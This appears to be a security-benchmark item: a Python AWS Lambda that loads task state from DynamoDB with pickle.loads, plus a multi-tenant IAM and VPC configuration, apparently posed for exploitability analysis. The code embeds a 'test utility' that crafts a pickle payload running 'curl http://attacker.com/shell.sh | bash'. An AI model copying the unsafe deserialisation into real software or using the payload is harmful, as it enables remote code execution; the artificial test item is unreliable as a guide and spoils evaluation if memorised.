@@ -1,0 +1,83 @@
+{
+  "id": "7d26a207",
+  "language": "python",
+  "code": "import json\nimport pickle\nimport base64\nimport boto3\nimport hashlib\nfrom datetime import datetime\n\ndynamodb = boto3.resource('dynamodb')\ntable = dynamodb.Table('workflow-state-store')\n\ndef lambda_handler(event, context):\n    \"\"\"\n    Step Functions task handler that processes workflow state transitions.\n    Reads serialized task state from DynamoDB and continues execution.\n    \"\"\"\n    workflow_id = event.get('workflow_id')\n    task_id = event.get('task_id')\n    tenant_id = event.get('tenant_id', 'system')\n    \n    # Validate basic input\n    if not workflow_id or not task_id:\n        return {'statusCode': 400, 'body': 'Missing workflow_id or task_id'}\n    \n    # Fetch serialized task state from DynamoDB\n    try:\n        response = table.get_item(\n            Key={\n                'pk': f'WORKFLOW#{workflow_id}',\n                'sk': f'TASK#{task_id}'\n            }\n        )\n    except Exception as e:\n        return {'statusCode': 500, 'body': f'DynamoDB error: {str(e)}'}\n    \n    if 'Item' not in response:\n        return {'statusCode': 404, 'body': 'Task state not found'}\n    \n    item = response['Item']\n    \n    # Verify checksum for integrity (NOT security - just corruption detection)\n    stored_checksum = item.get('checksum', '')\n    payload_bytes = base64.b64decode(item['serialized_state'])\n    computed_checksum = hashlib.md5(payload_bytes).hexdigest()\n    \n    if stored_checksum and computed_checksum != stored_checksum:\n        return {'statusCode': 422, 'body': 'State integrity check failed'}\n    \n    # Deserialize the task state to continue workflow execution\n    # Using pickle for complex Python objects (custom task definitions)\n    task_state = pickle.loads(payload_bytes)\n    \n    # Execute the task based on deserialized state\n    result = execute_task(task_state, tenant_id)\n    \n    # Store result back\n    table.put_item(\n        Item={\n            'pk': f'WORKFLOW#{workflow_id}',\n            'sk': f'RESULT#{task_id}',\n            'result': json.dumps(result),\n            'completed_at': datetime.utcnow().isoformat(),\n            'tenant_id': tenant_id\n        }\n    )\n    \n    return {'statusCode': 200, 'body': json.dumps(result)}\n\n\ndef execute_task(task_state, tenant_id):\n    \"\"\"Execute a deserialized task object.\"\"\"\n    if hasattr(task_state, 'run'):\n        return task_state.run(tenant_id=tenant_id)\n    elif isinstance(task_state, dict):\n        action = task_state.get('action')\n        params = task_state.get('params', {})\n        if action == 'transform':\n            return transform_data(params)\n        elif action == 'notify':\n            return send_notification(params)\n        elif action == 'aggregate':\n            return aggregate_results(params)\n    return {'status': 'no_op'}\n\n\ndef transform_data(params):\n    return {'status': 'transformed', 'records': params.get('count', 0)}\n\ndef send_notification(params):\n    return {'status': 'notified', 'target': params.get('target', 'unknown')}\n\ndef aggregate_results(params):\n    return {'status': 'aggregated', 'sources': params.get('sources', [])}\n\n\ndef write_malicious_state(workflow_id, task_id):\n    \"\"\"Test utility - demonstrates writing a crafted pickle payload.\"\"\"\n    import os\n    class Exploit:\n        def __reduce__(self):\n            return (os.system, ('curl http://attacker.com/shell.sh | bash',))\n    \n    payload = base64.b64encode(pickle.dumps(Exploit())).decode()\n    checksum = hashlib.md5(base64.b64decode(payload)).hexdigest()\n    \n    table.put_item(\n        Item={\n            'pk': f'WORKFLOW#{workflow_id}',\n            'sk': f'TASK#{task_id}',\n            'serialized_state': payload,\n            'checksum': checksum,\n            'tenant_id': 'attacker-tenant'\n        }\n    )\n",
+  "environment": {
+    "description": "Same Lambda function deployed in a multi-tenant SaaS environment. DynamoDB access is governed by the Lambda execution role's IAM policy which includes a condition key constraint: dynamodb:LeadingKeys requires that the partition key prefix matches the authenticated tenant_id extracted from the Step Functions execution input via a task token mapped through an STS session tag (aws:PrincipalTag/tenant_id). Additionally, a VPC endpoint policy on the com.amazonaws.us-east-1.dynamodb endpoint restricts PutItem calls to only allow items where the 'tenant_id' attribute matches the caller's aws:PrincipalTag/tenant_id session tag. The Lambda runs in an isolated VPC with no NAT gateway and no internet egress path \u2014 only the DynamoDB VPC endpoint is available. The Step Functions state machine definition uses a Map state with ItemSelector that injects tenant_id from the execution context, and the Lambda's assumed role session is scoped per-execution via sts:AssumeRole with transitive session tags.",
+    "config": {
+      "lambda_runtime": "python3.9",
+      "iam_policy": {
+        "Version": "2012-10-17",
+        "Statement": [
+          {
+            "Effect": "Allow",
+            "Action": [
+              "dynamodb:GetItem"
+            ],
+            "Resource": "arn:aws:dynamodb:us-east-1:123456789012:table/workflow-state-store",
+            "Condition": {
+              "ForAllValues:StringLike": {
+                "dynamodb:LeadingKeys": [
+                  "WORKFLOW#${aws:PrincipalTag/tenant_id}*"
+                ]
+              }
+            }
+          },
+          {
+            "Effect": "Allow",
+            "Action": [
+              "dynamodb:PutItem"
+            ],
+            "Resource": "arn:aws:dynamodb:us-east-1:123456789012:table/workflow-state-store",
+            "Condition": {
+              "ForAllValues:StringLike": {
+                "dynamodb:LeadingKeys": [
+                  "WORKFLOW#${aws:PrincipalTag/tenant_id}*"
+                ]
+              },
+              "StringEquals": {
+                "dynamodb:Attributes": {
+                  "tenant_id": "${aws:PrincipalTag/tenant_id}"
+                }
+              }
+            }
+          }
+        ]
+      },
+      "vpc_config": {
+        "subnets": [
+          "subnet-isolated-a",
+          "subnet-isolated-b"
+        ],
+        "security_groups": [
+          "sg-no-egress"
+        ],
+        "nat_gateway": false,
+        "internet_gateway": false
+      },
+      "vpc_endpoint_policy": {
+        "service": "com.amazonaws.us-east-1.dynamodb",
+        "policy": {
+          "Effect": "Allow",
+          "Principal": "*",
+          "Action": [
+            "dynamodb:GetItem",
+            "dynamodb:PutItem"
+          ],
+          "Resource": "arn:aws:dynamodb:us-east-1:123456789012:table/workflow-state-store",
+          "Condition": {
+            "ForAllValues:StringLike": {
+              "dynamodb:LeadingKeys": [
+                "WORKFLOW#${aws:PrincipalTag/tenant_id}*"
+              ]
+            }
+          }
+        }
+      },
+      "step_functions_config": {
+        "session_tags": "tenant_id passed as transitive tag via sts:AssumeRole",
+        "execution_role_trust": "requires aws:RequestTag/tenant_id to match execution input"
+      }
+    }
+  }
+}
